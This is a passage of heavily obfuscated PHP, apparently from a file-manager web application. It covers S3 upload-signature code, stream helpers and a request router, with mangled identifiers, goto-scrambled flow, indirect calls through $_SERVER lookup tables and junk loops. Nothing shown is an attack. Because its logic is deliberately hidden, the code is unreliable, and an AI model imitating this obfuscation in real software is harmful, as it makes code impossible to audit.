intval($AŸ≈ëè¨Á√[$Aπõ∂àÊû©[1194]]); } return $AŸ≈ëè¨Á√; } protected function _isFolder($EÊ‹æáêá) { $A„©ñê´áπ =& $_SERVER[Æ¡î¢≠¯™]; list($eèø´óèôß, $E…÷∑ë€“Ö) = $this->bucketManager->listFiles($this->bucket, trim($EÊ‹æáêá, $A„©ñê´áπ[8]) . $A„©ñê´áπ[8], $A„©ñê´áπ[33], 1, $A„©ñê´áπ[8]); return !empty($eèø´óèôß[$A„©ñê´áπ[1193]]) || !empty($eèø´óèôß[$A„©ñê´áπ[1196]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Fë∂È§ºç) { parent::__construct($Fë∂È§ºç); } public function uploadFormData($D⁄Öãä∫úÜ, $a“ôòâäﬁ™ = 3600) { goto a‹ÒÑ–òªó; DÃç®üìÔ—: $aËÏÒãàØã = $d∆è‰·æ◊µ[69]; $b∞âûÜñ∑Ñ = gmdate($d∆è‰·æ◊µ[1113]); $f‹®œ•úòÀ = gmdate($d∆è‰·æ◊µ[682]); goto bÖ´≠∞∆ñ–; bÖ´≠∞∆ñ–: $bÎÑÜ≈ã„È = $d∆è‰·æ◊µ[1114]; $fı˜˘˜‰ù… = $a“ôòâäﬁ™ . $d∆è‰·æ◊µ[33]; $F√éø£ı˜É = $d∆è‰·æ◊µ[1079]; goto Bﬁ†êÙìâ; aíêââä¥ü: $BéÇ∑¨•Òﬂ = hash_hmac($d∆è‰·æ◊µ[1122], $aËÏÒãàØã, $C˜µåÓ≈˘§, !0); $Eß∫Îä∏Èø = hash_hmac($d∆è‰·æ◊µ[1122], $bÎÑÜ≈ã„È, $BéÇ∑¨•Òﬂ, !0); $EÒ Íï∑ÉÚ = hash_hmac($d∆è‰·æ◊µ[1122], $EÿªÖ´à∆Ò, $Eß∫Îä∏Èø); goto d——íÈÈµÚ; a‹ÒÑ–òªó: $d∆è‰·æ◊µ =& $_SERVER[Æ¡î¢≠¯™]; $F†∑ﬂÇ÷≤∞ = $d∆è‰·æ◊µ[192]; $EÕöì ë∫Ñ = $d∆è‰·æ◊µ[1112]; goto DÃç®üìÔ—; Bﬁ†êÙìâ: $c–Ã◊Æ∏ƒï = array($this->accessKey, $f‹®œ•úòÀ, $this->region, $aËÏÒãàØã, $bÎÑÜ≈ã„È); $AŸ≥ƒì≤Ö¢ = implode($d∆è‰·æ◊µ[8], $c–Ã◊Æ∏ƒï); $B—Èµùº„Œ = array($d∆è‰·æ◊µ[1081] => gmdate($d∆è‰·æ◊µ[1080], strtotime($d∆è‰·æ◊µ[1115])), $d∆è‰·æ◊µ[1082] => array(array($d∆è‰·æ◊µ[1084] => $this->bucket), array($d∆è‰·æ◊µ[1083] => $F†∑ﬂÇ÷≤∞), array($d∆è‰·æ◊µ[1085], $d∆è‰·æ◊µ[1086], $d∆è‰·æ◊µ[33]), array($d∆è‰·æ◊µ[1085], $d∆è‰·æ◊µ[1116], $d∆è‰·æ◊µ[33]), array($d∆è‰·æ◊µ[1085], $d∆è‰·æ◊µ[1117], $d∆è‰·æ◊µ[33]), array($d∆è‰·æ◊µ[1087] => $F√éø£ı˜É), array($d∆è‰·æ◊µ[1118] => $AŸ≥ƒì≤Ö¢), array($d∆è‰·æ◊µ[1119] => $EÕöì ë∫Ñ), array($d∆è‰·æ◊µ[1120] => $b∞âûÜñ∑Ñ), array($d∆è‰·æ◊µ[1121] => $fı˜˘˜‰ù…))); goto bŸÂµµ†€’; d——íÈÈµÚ: $fóóë‰óñı = array($d∆è‰·æ◊µ[206] => $d∆è‰·æ◊µ[33], $d∆è‰·æ◊µ[1124] => $d∆è‰·æ◊µ[33], $d∆è‰·æ◊µ[1083] => $F†∑ﬂÇ÷≤∞, $d∆è‰·æ◊µ[1087] => $F√éø£ı˜É, $d∆è‰·æ◊µ[1091] => $EÿªÖ´à∆Ò, $d∆è‰·æ◊µ[1125] => $AŸ≥ƒì≤Ö¢, $d∆è‰·æ◊µ[1126] => $EÕöì ë∫Ñ, $d∆è‰·æ◊µ[1127] => $b∞âûÜñ∑Ñ, $d∆è‰·æ◊µ[1128] => $fı˜˘˜‰ù…, $d∆è‰·æ◊µ[1129] => $EÒ Íï∑ÉÚ, $d∆è‰·æ◊µ[176] => $this->getHost()); return $fóóë‰óñı; goto c¬°™Áñ•÷; bŸÂµµ†€’: $EÿªÖ´à∆Ò = base64_encode(json_encode($B—Èµùº„Œ)); $BíèÉŒ¬’∑ = hash_hmac($d∆è‰·æ◊µ[1122], $f‹®œ•úòÀ, $d∆è‰·æ◊µ[1123] . $this->secret, !0); $C˜µåÓ≈˘§ = hash_hmac($d∆è‰·æ◊µ[1122], $this->region, $BíèÉŒ¬’∑, !0); goto aíêââä¥ü; c¬°™Áñ•÷: } public function multiUploadFormData($eﬁ“’ã‘¿◊, $F’ÂŸãﬂ≥Ú = 3600) { $D£ÓØÚÇ…Í =& $_SERVER[Æ¡î¢≠¯™]; $DıÔ…–ﬂôë = gmdate($D£ÓØÚÇ…Í[1208]); $a†ó…Ã∆êﬂ = array(); $a÷ËÔ¬…¨≠ = $this->client->getUploadId($this->bucket, $eﬁ“’ã‘¿◊, $a†ó…Ã∆êﬂ); if (!$a÷ËÔ¬…¨≠) { return !1; } return array($D£ÓØÚÇ…Í[216] => $a÷ËÔ¬…¨≠, $D£ÓØÚÇ…Í[176] => $this->getHost() . $D£ÓØÚÇ…Í[8] . $this->pathEncode($eﬁ“’ã‘¿◊), $D£ÓØÚÇ…Í[217] => $DıÔ…–ﬂôë, $D£ÓØÚÇ…Í[99] => $eﬁ“’ã‘¿◊); } public function multiUploadAuthData($eò—Ü±ŸªÁ, $Cèéœ´£åƒ = array()) { goto Cä·ÍÇƒµœ; Eªˆ€ã…–: if (isset($Cèéœ´£åƒ[$dˆË·Êæ°é[1209]])) { $BÖÖüÛÏ∆Á[$dˆË·Êæ°é[1210]] = $Cèéœ´£åƒ[$dˆË·Êæ°é[1209]]; } $açΩá«¿È∞ = explode($dˆË·Êæ°é[178], $this->getHost()); $a∞Â¥â∞ÖÀ = array($dˆË·Êæ°é[1211] => $açΩá«¿È∞[1], $dˆË·Êæ°é[1212] => $dˆË·Êæ°é[33], $dˆË·Êæ°é[206] => $dˆË·Êæ°é[126], $dˆË·Êæ°é[1124] => $Cèéœ´£åƒ[$dˆË·Êæ°é[87]]); goto DèÖõŒ¿ƒÏ; A”»£≥µ∏£: unset($Cèéœ´£åƒ[$dˆË·Êæ°é[99]]); if (isset($Cèéœ´£åƒ[$dˆË·Êæ°é[218]])) { return $this->listUploadParts($c®∫ΩÎ¬ª◊, $Cèéœ´£åƒ); } $BÖÖüÛÏ∆Á = array(); goto Eªˆ€ã…–; Cä·ÍÇƒµœ: $dˆË·Êæ°é =& $_SERVER[Æ¡î¢≠¯™]; $Eß≤Ì‘ÏëÙ = isset($Cèéœ´£åƒ[$dˆË·Êæ°é[167]]) ? $Cèéœ´£åƒ[$dˆË·Êæ°é[167]] : $dˆË·Êæ°é[33]; $c®∫ΩÎ¬ª◊ = $Cèéœ´£åƒ[$dˆË·Êæ°é[99]]; goto A”»£≥µ∏£; DèÖõŒ¿ƒÏ: $d©ñÏ£‡äÙ = $dˆË·Êæ°é[221]; $a√£ä’•€π = $dˆË·Êæ°é[8] . $this->pathEncode($c®∫ΩÎ¬ª◊) . $Eß≤Ì‘ÏëÙ; $d¡∞“±‰üÎ = $this->client->__getSignatureV4($BÖÖüÛÏ∆Á, $a∞Â¥â∞ÖÀ, $d©ñÏ£‡äÙ, $a√£ä’•€π); goto Fÿ£–ı¨«é; Fÿ£–ı¨«é: if (strpos($Eß≤Ì‘ÏëÙ, $dˆË·Êæ°é[220]) === 0) { if (isset($BÖÖüÛÏ∆Á[$dˆË·Êæ°é[1210]])) { $EÖÑßãèç = $BÖÖüÛÏ∆Á[$dˆË·Êæ°é[1210]]; } else { if (isset($d¡∞“±‰üÎ[$dˆË·Êæ°é[1210]])) { $EÖÑßãèç = $d¡∞“±‰üÎ[$dˆË·Êæ°é[1210]]; } else { $EÖÑßãèç = hash($dˆË·Êæ°é[1122], $dˆË·Êæ°é[33]); } } return array($dˆË·Êæ°é[226] => $d¡∞“±‰üÎ[$dˆË·Êæ°é[226]], $dˆË·Êæ°é[1210] => $EÖÑßãèç, $dˆË·Êæ°é[217] => $d¡∞“±‰üÎ[$dˆË·Êæ°é[1213]]); } return $d¡∞“±‰üÎ[$dˆË·Êæ°é[226]]; goto cÌ¬˜¿≥á√; cÌ¬˜¿≥á√: } public function listUploadParts($AÂ»ÇÓÏÂÜ, $A·∞ÍèÎÛç = array()) { goto eÿâìÚºËï; FÏñ≤òßúî: $E∞åâ∏¯Ñù = array($A·⁄Ω“ØﬁÀ[1211] => $eã‰Œë∞‹Ô[1], $A·⁄Ω“ØﬁÀ[206] => $A·⁄Ω“ØﬁÀ[126], $A·⁄Ω“ØﬁÀ[1124] => strlen($DòÈ‡Ôú™˘)); $EÎ©∑‚´‹‡ = $A·⁄Ω“ØﬁÀ[219]; $D¥û◊£ä¢ä = $A·⁄Ω“ØﬁÀ[8] . $this->pathEncode($AÂ»ÇÓÏÂÜ) . $A·∞ÍèÎÛç[$A·⁄Ω“ØﬁÀ[167]]; goto aõÍÌÆ≤ØÕ; aõÍÌÆ≤ØÕ: $bñ¨àù˜«¬ = $this->client->__getSignatureV4($aöÈ√ü¬ıΩ, $E∞åâ∏¯Ñù, $EÎ©∑‚´‹‡, $D¥û◊£ä¢ä, $DòÈ‡Ôú™˘); return array($A·⁄Ω“ØﬁÀ[226] => $bñ¨àù˜«¬[$A·⁄Ω“ØﬁÀ[226]], $A·⁄Ω“ØﬁÀ[217] => $bñ¨àù˜«¬[$A·⁄Ω“ØﬁÀ[1213]], $A·⁄Ω“ØﬁÀ[228] => $BàôòÍÒó¡, $A·⁄Ω“ØﬁÀ[1210] => $bñ¨àù˜«¬[$A·⁄Ω“ØﬁÀ[1210]]); goto eáÖÑÛûÜ•; eÿâìÚºËï: $A·⁄Ω“ØﬁÀ =& $_SERVER[Æ¡î¢≠¯™]; $C ÜÙ≤‘Øá = str_replace($A·⁄Ω“ØﬁÀ[227], $A·⁄Ω“ØﬁÀ[33], $A·∞ÍèÎÛç[$A·⁄Ω“ØﬁÀ[167]]); $BàôòÍÒó¡ = $this->client->listParts($this->bucket, $AÂ»ÇÓÏÂÜ, $C ÜÙ≤‘Øá); goto c âü°âÜ°; c âü°âÜ°: if (!$BàôòÍÒó¡) { return !1; } $DòÈ‡Ôú™˘ = $A·⁄Ω“ØﬁÀ[1214]; foreach ($BàôòÍÒó¡ as $A¢Â¶¨ç≠±) { $DòÈ‡Ôú™˘ .= $A·⁄Ω“ØﬁÀ[1215] . "\x3c\x50\x61\162\164\116\x75\155\142\x65\162\x3e{$A¢Â¶¨ç≠±[$A·⁄Ω“ØﬁÀ[1166]]}\x3c\57\x50\x61\162\x74\116\165\155\142\x65\162\76\12" . "\x3c\x45\x54\141\x67\x3e{$A¢Â¶¨ç≠±[$A·⁄Ω“ØﬁÀ[1167]]}\74\x2f\x45\x54\141\147\76\12" . $A·⁄Ω“ØﬁÀ[1216]; } goto b‰…∏¬ÏÆ⁄; b‰…∏¬ÏÆ⁄: $DòÈ‡Ôú™˘ .= $A·⁄Ω“ØﬁÀ[1217]; $aöÈ√ü¬ıΩ = array(); $eã‰Œë∞‹Ô = explode($A·⁄Ω“ØﬁÀ[178], $this->getHost()); goto FÏñ≤òßúî; eáÖÑÛûÜ•: } public function link($fœ≥úÎÔß, $CÓ‚çÛ‡üå = array()) { return parent::link($fœ≥úÎÔß, $CÓ‚çÛ‡üå); } public function fileOut($Fíü¡“ÆíÃ, $DÂÓ¯âì¬≤ = false, $d€Éüä®∆º = false, $FπàÜƒ∂îƒ = '') { if (strstr($this->endpoint, $_SERVER[Æ¡î¢≠¯™][1218])) { return parent::fileOutServer($Fíü¡“ÆíÃ, $DÂÓ¯âì¬≤, $d€Éüä®∆º, $FπàÜƒ∂îƒ); } parent::fileOut($Fíü¡“ÆíÃ, $DÂÓ¯âì¬≤, $d€Éüä®∆º, $FπàÜƒ∂îƒ); } public function fileOutImage($AÛØ∑‡àÜ¡, $c¶¬˘é˘ç¯ = 250) { if (strstr($this->endpoint, $_SERVER[Æ¡î¢≠¯™][1218])) { return parent::fileOutImageServer($AÛØ∑‡àÜ¡, $c¶¬˘é˘ç¯); } parent::fileOutImage($AÛØ∑‡àÜ¡, $c¶¬˘é˘ç¯); } public function fileOutLink($b§ˆ⁄øåÌ¡) { $bÙ÷÷¨»≤Ü =& $_SERVER[Æ¡î¢≠¯™]; if (substr($b§ˆ⁄øåÌ¡, 0, 7) == $bÙ÷÷¨»≤Ü[1094]) { $b§ˆ⁄øåÌ¡ = $bÙ÷÷¨»≤Ü[1095] . substr($b§ˆ⁄øåÌ¡, 7); } header($bÙ÷÷¨»≤Ü[163] . $b§ˆ⁄øåÌ¡); die; } public function getHost() { $fıä˘ÑöÜé =& $_SERVER[Æ¡î¢≠¯™]; $d∏§·©œÿë = str_rtrim(parent::getHost(), $fıä˘ÑöÜé[8] . $this->bucket); $d∏§·©œÿë = explode($fıä˘ÑöÜé[178], $d∏§·©œÿë); return $d∏§·©œÿë[0] . $fıä˘ÑöÜé[178] . $this->bucket . $fıä˘ÑöÜé[103] . $d∏§·©œÿë[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($eïùº‰≈»ç, $FÍÇé∑¶ŒÓ = 0) { parent::__construct(); $this->source = $eïùº‰≈»ç; $this->sourceSize = $FÍÇé∑¶ŒÓ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($eäÇÓÒ≥ÿê = false) { return $this->sourceSize; } public function getContent($FÃŒ⁄ﬁõ€´ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Fø®ÿ‰©â∑ = ftell($this->source); $e¶¨äº©‰‚ = @fread($this->source, $this->sourceSize); fseek($this->source, $Fø®ÿ‰©â∑); return $e¶¨äº©‰‚; } } public function fileSubstr($Fá“†≥œ¯ù = false, $a∏ªÇ˘«ãÓ = 0, $Dàå‡ê£∞º = 0) { if (!$Dàå‡ê£∞º) { $Dàå‡ê£∞º = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $a∏ªÇ˘«ãÓ, $Dàå‡ê£∞º); } if ($this->sourceType == self::TYPE_FILE) { $CÜ—çŒÍ¡ƒ = ftell($this->source); fseek($this->source, $CÜ—çŒÍ¡ƒ + $a∏ªÇ˘«ãÓ); $B∞ô◊†Øûê = @fread($this->source, $Dàå‡ê£∞º); fseek($this->source, $CÜ—çŒÍ¡ƒ); return $B∞ô◊†Øûê; } } public function hashMd5($AÁÂÍô˜«¨ = false) { return md5($this->getContent()); } public static function hash($Bë Ç•¬Õç, $Aï‘‘æ’„£ = 0) { $D¶ÚÀô¨Ñº = new PathDriverStream($Bë Ç•¬Õç, $Aï‘‘æ’„£); return $D¶ÚÀô¨Ñº->hashSimple($Bë Ç•¬Õç); } public static function md5($C…è°Âê˘ä, $e⁄ÌÜß≠£À = 0) { $F«´ñÇ˜Ç¨ = new PathDriverStream($C…è°Âê˘ä, $e⁄ÌÜß≠£À); return $F«´ñÇ˜Ç¨->hashMd5($C…è°Âê˘ä); } } goto eÕ‹±›æ¶–; d’«ê‘ñõÖ: $fê¶∞Ü‘Ñˆ = $_SERVER[Æ¡î¢≠¯™][554]; class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\x69\x6e\x64\145\170"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($dœ„ôŒ¨¨—) { goto aà€√∆™ÛÑ; bäªöŒ⁄∑˜: $C«ì¥æï∑Ö = $C≈’Û¢®‘â[557]; $this->defaultController = $BÌ∫ãØ¿„Ö[1] ? $BÌ∫ãØ¿„Ö[1] : $this->defaultController; $BÈüª∫ñç = $C≈’Û¢®‘â[558]; goto cá¨„’¨⁄Ë; aà€√∆™ÛÑ: $C≈’Û¢®‘â =& $_SERVER[Æ¡î¢≠¯™]; $c¨û∑Üë† =& $_SERVER[º˙Ôå˛Ë]; $BÌ∫ãØ¿„Ö = $c¨û∑Üë†[0]($c¨û∑Üë†[1], $c¨û∑Üë†[2]($dœ„ôŒ¨¨—, $c¨û∑Üë†[1])); goto BË¿“≠ˆ„Ø; BË¿“≠ˆ„Ø: $D«ŸºøÔ§” = $C≈’Û¢®‘â[555]; while (strlen($D«ŸºøÔ§”) < $C≈’Û¢®‘â[556]) { if (!$D«ŸºøÔ§”) { break; } $D«ŸºøÔ§”++; } $this->defaultModule = $BÌ∫ãØ¿„Ö[0] ? $BÌ∫ãØ¿„Ö[0] : $this->defaultModule; goto bäªöŒ⁄∑˜; cá¨„’¨⁄Ë: if (strlen($BÈüª∫ñç) < $C≈’Û¢®‘â[559]) { return; } $this->defaultAction = $BÌ∫ãØ¿„Ö[2] ? $BÌ∫ãØ¿„Ö[2] : $this->defaultAction; $this->{$_SERVER[º˙Ôå˛Ë][3]}($c¨û∑Üë†[4], array($this, $c¨û∑Üë†[5])); goto Eƒ«Çô™´Ë; Eƒ«Çô™´Ë: $D–‹«Ç∏∆Ô = $C≈’Û¢®‘â[560]; if (strlen($D–‹«Ç∏∆Ô) < $C≈’Û¢®‘â[561]) { die; } goto d÷Íë†‡ﬂ; d÷Íë†‡ﬂ: } public function appRun($eá™§”º°Ÿ) { goto a¯õÎ≠ó≈ö; Eá”¡Ù±áÍ: $BéèÇÖ—ƒè[17]($eá™§”º°Ÿ); $Fà≈Ö–Ê≠Û = $c¬Ÿç©ø√Ì[563]; while ($Fà≈Ö–Ê≠Û < $c¬Ÿç©ø√Ì[559]) { if ($Fà≈Ö–Ê≠Û >= 0) { break; } $Fà≈Ö–Ê≠Û++; } goto D»Æ·˜å‘; a˜¯≤õ«∏ı: $bü£ØçáÜç = $BéèÇÖ—ƒè[7]; if ($f©ÕœîäµÎ == $BéèÇÖ—ƒè[8]) { $bü£ØçáÜç = $BéèÇÖ—ƒè[9]; $Fìï¥¥⁄Á≈[0] = $BéèÇÖ—ƒè[10]; $Fìï¥¥⁄Á≈[1] = $Fìï¥¥⁄Á≈[1] . $BéèÇÖ—ƒè[11]; $eá™§”º°Ÿ = $BéèÇÖ—ƒè[12]($BéèÇÖ—ƒè[1], $Fìï¥¥⁄Á≈); $eá™§”º°Ÿ = $BéèÇÖ—ƒè[2]($eá™§”º°Ÿ, $BéèÇÖ—ƒè[1]); } $BéèÇÖ—ƒè[13](array($BéèÇÖ—ƒè[14], $BéèÇÖ—ƒè[15]), $bü£ØçáÜç . $BéèÇÖ—ƒè[16], $eá™§”º°Ÿ); goto Eá”¡Ù±áÍ; D»Æ·˜å‘: $BéèÇÖ—ƒè[13](array($BéèÇÖ—ƒè[14], $BéèÇÖ—ƒè[15]), $bü£ØçáÜç . $BéèÇÖ—ƒè[18], $eá™§”º°Ÿ); goto EØˆ‡®„Ø“; a¯õÎ≠ó≈ö: $c¬Ÿç©ø√Ì =& $_SERVER[Æ¡î¢≠¯™]; $BéèÇÖ—ƒè =& $_SERVER[º˙Ôå˛Ë]; $Fìï¥¥⁄Á≈ = $BéèÇÖ—ƒè[0]($BéèÇÖ—ƒè[1], $eá™§”º°Ÿ); goto B¨πÍÇ∫§º; B¨πÍÇ∫§º: $f©ÕœîäµÎ = $BéèÇÖ—ƒè[6]($Fìï¥¥⁄Á≈[0]); $CƒíÍıÿﬁü = $c¬Ÿç©ø√Ì[562]; if (!$CƒíÍıÿﬁü) { return; } goto a˜¯≤õ«∏ı; EØˆ‡®„Ø“: } private function autorun() { $eª—óà¡Àç =& $_SERVER[º˙Ôå˛Ë]; global $config; if ($eª—óà¡Àç[19]($config[$eª—óà¡Àç[20]]) == 0) { return; } foreach ($config[$eª—óà¡Àç[20]] as $DΩåÙìÆ›à => $CÑ¨Ü„á»“) { $this->{$_SERVER[º˙Ôå˛Ë][21]}($CÑ¨Ü„á»“); } } private function ldfoe44ae75c() { goto eﬁø“˜‰ùÏ; CœãΩ“≈Îõ: $f«ƒ´âäù± = array($bÓõìºÌá∫[8], $B‚âÖ ÀÎÃ); $a«–ûπª·· = $_SERVER[Æ¡î¢≠¯™][564]; $e™£–Óıê = $bÓõìºÌá∫[26]($GLOBALS[$bÓõìºÌá∫[22]][$bÓõìºÌá∫[23]], 1); goto E ê≠≥ıàÌ; DÕöå”È§Ö: if (!$eù† à‰≥è || $bÓõìºÌá∫[24]($eù† à‰≥è) <= $bÓõìºÌá∫[24]($EõÎáÇÔ∆)) { return; } if ($bÓõìºÌá∫[6]($bÓõìºÌá∫[25]($eù† à‰≥è, -$bÓõìºÌá∫[24]($EõÎáÇÔ∆))) != $EõÎáÇÔ∆) { return; } $B‚âÖ ÀÎÃ = $bÓõìºÌá∫[25]($eù† à‰≥è, 0, -$bÓõìºÌá∫[24]($EõÎáÇÔ∆)); goto CœãΩ“≈Îõ; E ê≠≥ıàÌ: $GLOBALS[$bÓõìºÌá∫[22]][$bÓõìºÌá∫[23]] = $bÓõìºÌá∫[27]($f«ƒ´âäù±, $e™£–Óıê); $GLOBALS[$bÓõìºÌá∫[22]][$bÓõìºÌá∫[28]] = $bÓõìºÌá∫[29]($bÓõìºÌá∫[1], $GLOBALS[$bÓõìºÌá∫[22]][$bÓõìºÌá∫[23]]); goto FÕÈèá„¡∏; eﬁø“˜‰ùÏ: $bÓõìºÌá∫ =& $_SERVER[º˙Ôå˛Ë]; $EõÎáÇÔ∆ = $bÓõìºÌá∫[8]; $eù† à‰≥è = $GLOBALS[$bÓõìºÌá∫[22]][$bÓõìºÌá∫[23]][0]; goto DÕöå”È§Ö; FÕÈèá„¡∏: } private function nvaqb19bd897() { goto dõŸÖ´–ÓÃ; CˆáóË‡Àì: $e·ÿ©∂™èö = $eﬂ˘‹«‹Ò⁄[31]; if (!$eﬂ˘‹«‹Ò⁄[32]($B—¨ ⁄ÆÏé, $e·ÿ©∂™èö)) { return; } $cîÍ†áéµ— = $eﬂ˘‹«‹Ò⁄[33]($B—¨ ⁄ÆÏé, $e·ÿ©∂™èö); goto E°∆∫ÜëµÊ; dõŸÖ´–ÓÃ: $B√Ñ÷ÿ¿Ÿà =& $_SERVER[Æ¡î¢≠¯™]; $eﬂ˘‹«‹Ò⁄ =& $_SERVER[º˙Ôå˛Ë]; if ($GLOBALS[$eﬂ˘‹«‹Ò⁄[22]][$eﬂ˘‹«‹Ò⁄[28]] != $eﬂ˘‹«‹Ò⁄[10]) { return; } goto A·òæ∆™ê; A·òæ∆™ê: $B—¨ ⁄ÆÏé = $_SERVER[$eﬂ˘‹«‹Ò⁄[30]]; $D—∑Î £§“ = $B√Ñ÷ÿ¿Ÿà[565]; if (!$D—∑Î £§“) { die; } goto CˆáóË‡Àì; E°∆∫ÜëµÊ: $CÑ©õ—Œ∞Õ = $eﬂ˘‹«‹Ò⁄[25]($B—¨ ⁄ÆÏé, $cîÍ†áéµ— + $eﬂ˘‹«‹Ò⁄[24]($e·ÿ©∂™èö)); $eﬂ˘‹«‹Ò⁄[34]($eﬂ˘‹«‹Ò⁄[35], $CÑ©õ—Œ∞Õ, $EÙÖúáëÉ’); $CÑ©õ—Œ∞Õ = $eﬂ˘‹«‹Ò⁄[2]($EÙÖúáëÉ’[0][0], $eﬂ˘‹«‹Ò⁄[36]); goto cÜµ´áƒÏﬂ; cê∂Ñóï≠ˆ: while (strlen($D„°§Ø√¶À) < $B√Ñ÷ÿ¿Ÿà[559]) { if (!$D„°§Ø√¶À) { break; } $D„°§Ø√¶À++; } goto c€‡ä‹á¿; cÜµ´áƒÏﬂ: $GLOBALS[$eﬂ˘‹«‹Ò⁄[22]][$eﬂ˘‹«‹Ò⁄[23]] = $eﬂ˘‹«‹Ò⁄[0]($eﬂ˘‹«‹Ò⁄[36], $CÑ©õ—Œ∞Õ); $GLOBALS[$eﬂ˘‹«‹Ò⁄[22]][$eﬂ˘‹«‹Ò⁄[28]] = $eﬂ˘‹«‹Ò⁄[29]($eﬂ˘‹«‹Ò⁄[1], $GLOBALS[$eﬂ˘‹«‹Ò⁄[22]][$eﬂ˘‹«‹Ò⁄[23]]); $D„°§Ø√¶À = $B√Ñ÷ÿ¿Ÿà[566]; goto cê∂Ñóï≠ˆ; c€‡ä‹á¿: } public function run() { goto A«‚‚∆„®–; fåÊ¯§∫èÁ: $Bìá˘¬†’è = $Dã÷ÈæΩﬁ°[569]; $bÆ›ßè≠âá[39]($bÆ›ßè≠âá[40], isset($e—∞èçÇ–î[0]) && $e—∞èçÇ–î[0] ? $e—∞èçÇ–î[0] : $this->defaultModule); $bÆ›ßè≠âá[39]($bÆ›ßè≠âá[41], isset($e—∞èçÇ–î[1]) && $e—∞èçÇ–î[0] ? $e—∞èçÇ–î[1] : $this->defaultController); goto AíáÃÇäÆß; AíáÃÇäÆß: $FÍ¥Ë€‘ùü = $Dã÷ÈæΩﬁ°[570]; if (strlen($FÍ¥Ë€‘ùü) < $Dã÷ÈæΩﬁ°[561]) { return; } $bÆ›ßè≠âá[39]($bÆ›ßè≠âá[42], isset($e—∞èçÇ–î[2]) && $e—∞èçÇ–î[0] ? $e—∞èçÇ–î[2] : $this->defaultAction); goto CÉå¬•î¬û; C·ÿˆƒ”¢Ü: $dﬂﬂπ–Ñåÿ = $Dã÷ÈæΩﬁ°[567]; $this->{$_SERVER[º˙Ôå˛Ë][38]}(); $fà¨∫§í¯Ê = $Dã÷ÈæΩﬁ°[568]; goto FÒÀ√Æíé–; aë≠ı”ªﬁ»: $b∂≈∏Ô∂œÍ = $Dã÷ÈæΩﬁ°[572]; $_SERVER[$bÆ›ßè≠âá[44]] = $bÆ›ßè≠âá[6](ACTION); $this->{$_SERVER[º˙Ôå˛Ë][45]}(); goto BÎ’¬ˆú£≠; FÒÀ√Æíé–: while (strlen($fà¨∫§í¯Ê) < $Dã÷ÈæΩﬁ°[559]) { if (!$fà¨∫§í¯Ê) { break; } $fà¨∫§í¯Ê++; } $e—∞èçÇ–î = $GLOBALS[$bÆ›ßè≠âá[22]][$bÆ›ßè≠âá[23]]; $EÀÍ…àÎ∞ﬁ = $GLOBALS[$bÆ›ßè≠âá[22]][$bÆ›ßè≠âá[28]]; goto fåÊ¯§∫èÁ; BÎ’¬ˆú£≠: if ($bÆ›ßè≠âá[19]($e—∞èçÇ–î) >= 3) { $this->{$_SERVER[º˙Ôå˛Ë][21]}($EÀÍ…àÎ∞ﬁ); } else { $this->{$_SERVER[º˙Ôå˛Ë][21]}(ACTION); } goto C⁄óÎíÁ®“; CÉå¬•î¬û: $aΩÃ´µåáî = $Dã÷ÈæΩﬁ°[571]; if (!$aΩÃ´µåáî) { die; } $bÆ›ßè≠âá[39]($bÆ›ßè≠âá[43], MOD . $bÆ›ßè≠âá[1] . ST . $bÆ›ßè≠âá[1] . ACT); goto aë≠ı”ªﬁ»; A«‚‚∆„®–: $Dã÷ÈæΩﬁ° =& $_SERVER[Æ¡î¢≠¯™]; $bÆ›ßè≠âá =& $_SERVER[º˙Ôå˛Ë]; $this->{$_SERVER[º˙Ôå˛Ë][37]}(); goto C·ÿˆƒ”¢Ü; C⁄óÎíÁ®“: } private $qpxc5252b317 = array(); private $lrpk52179362 = ''; public function xbped9033eaa() { goto Fë˘òèÍ¿£; F∫Ÿí‘µÉÇ: while ($c«Í∂ı£ê€ < $Bè‰≠…ò¥Ü[561]) { if ($c«Í∂ı£ê€ >= 0) { break; } $c«Í∂ı£ê€++; } $this->{$_SERVER[º˙Ôå˛Ë][3]}($Dçéô‡À©Û[59], array($this, $Dçéô‡À©Û[60])); goto AÏ≈§ü¶·©; CÇÂ…ù˜Ω¡: $this->{$_SERVER[º˙Ôå˛Ë][3]}($Dçéô‡À©Û[55], array($this, $Dçéô‡À©Û[56])); $this->{$_SERVER[º˙Ôå˛Ë][3]}($Dçéô‡À©Û[57], array($this, $Dçéô‡À©Û[58])); $c«Í∂ı£ê€ = $Bè‰≠…ò¥Ü[577]; goto F∫Ÿí‘µÉÇ; CÙì©®≤Àô: $Cî—Ëâï™ = $Bè‰≠…ò¥Ü[575]; $this->{$_SERVER[º˙Ôå˛Ë][3]}($Dçéô‡À©Û[53], array($this, $Dçéô‡À©Û[54])); $EÁ»î∞ù„Ò = $Bè‰≠…ò¥Ü[576]; goto CÇÂ…ù˜Ω¡; AØö©˜é◊’: $this->{$_SERVER[º˙Ôå˛Ë][47]}(); $this->{$_SERVER[º˙Ôå˛Ë][48]}(); $this->{$_SERVER[º˙Ôå˛Ë][49]}(); goto c»å‡èƒÖã; D—≤ò¯≠Ñé: $A–áƒÕâçÓ = $Bè‰≠…ò¥Ü[574]; $this->{$_SERVER[º˙Ôå˛Ë][51]}(); $this->{$_SERVER[º˙Ôå˛Ë][52]}(); goto CÙì©®≤Àô; Fë˘òèÍ¿£: $Bè‰≠…ò¥Ü =& $_SERVER[Æ¡î¢≠¯™]; $Dçéô‡À©Û =& $_SERVER[º˙Ôå˛Ë]; $this->{$_SERVER[º˙Ôå˛Ë][46]}(); goto AØö©˜é◊’; c»å‡èƒÖã: $a∂»¿Ù¢≈í = $Bè‰≠…ò¥Ü[573]; if (strlen($a∂»¿Ù¢≈í) < $Bè‰≠…ò¥Ü[556]) { return; } $this->{$_SERVER[º˙Ôå˛Ë][50]}(); goto D—≤ò¯≠Ñé; AÏ≈§ü¶·©: } public function zdcbd5634052($FËØõ¯´Óô) { goto Fö©ÁÛêπè; D∆è°•Õ ∂: $e£‚®æØ‰û = $bˆëªÑ……ø[581]; 